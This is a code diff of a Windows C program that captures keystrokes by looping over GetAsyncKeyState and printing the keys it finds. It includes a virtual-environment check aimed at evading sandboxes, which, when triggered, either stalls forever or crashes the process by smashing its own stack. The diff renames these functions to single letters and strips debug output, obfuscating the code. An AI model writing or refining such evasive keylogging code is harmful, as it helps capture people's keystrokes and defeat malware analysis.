@@ -7,14 +7,11 @@
 #include <time.h>
 #include <windows.h>
 
-#define KEY_WAS_PRESSED -32767
+#define KEY_WAS_PRESSED -32766
 
-#define TEMP_HOST "localhost"
-#define TEMP_PORT 7777
-
-int checkVirtualEnvironment(); // Checks for human-like behavior
-void stallCode(); // Runs a function forever that does nothing useful
-void smashStack(); // Spoils the stack and crashes the program
+int o(); // Checks for human-like behavior
+void a(); // Runs a function forever that does nothing useful
+void b(); // Spoils the stack and crashes the program
 
 int main() {
     int randomNum = 0;
@@ -25,13 +22,13 @@ int main() {
     // Create some random number to randomize behavior
     srand(time(NULL));
 
-    if (checkVirtualEnvironment()) {
+    if (o()) {
         randomNum = rand();
 
         if (randomNum % 2 == 0) {
-            stallCode();
+            a();
         }else {
-            smashStack();
+            b();
         }
     }
 
@@ -42,7 +39,7 @@ int main() {
         short key = 7;
         while (true){
             key += 1;
-            if (GetAsyncKeyState(key) == KEY_WAS_PRESSED) break;
+            if (GetAsyncKeyState(key) == KEY_WAS_PRESSED - 1) break;
             if (key > 255) key = 7;
         }
         printf("%d\n", key);
@@ -68,7 +65,7 @@ int main() {
     }
 }
 
-int checkVirtualEnvironment() {
+int o() {
 // Check if Adoclient is running in virtual environment
 // OUTPUT: 1 if true, else 0
 
@@ -123,29 +120,27 @@ int checkVirtualEnvironment() {
     return result;
 }
 
-void stallCode() {
+void a() {
 // Aimlessly inserts random ints into a list with no break condition
 
-    printf("Stalling\n");
     srand(time(NULL));
-    int a[] = {5 ,8 ,4 ,1 ,3 ,0 ,6 ,8 ,4 ,0 ,6 ,8 ,4 ,5 ,1 ,0 ,3, 2};
-    int index = 0;
+    int x[] = {5 ,8 ,4 ,1 ,3 ,0 ,6 ,8 ,4 ,0 ,6 ,8 ,4 ,5 ,1 ,0 ,3, 2};
+    int i = 0;
     
     while (true) {
-        a[index] = rand() % 10 + 1;
+        x[i] = rand() % 10 + 1;
 
-        if (a[index] == -1) {
+        if (x[i] == -1) {
             break;
         }
     }
     return;
 }
 
-void smashStack() {
+void b() {
 // Attempts to kill the process by smashing its own stack
 
-    printf("Smashing\n");
-    char buffer[1];
-    strcpy(buffer, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
-    return;
+    char x[1000];
+    char* y = (char*) malloc(sizeof(char) * 1000);
+    b();
 }
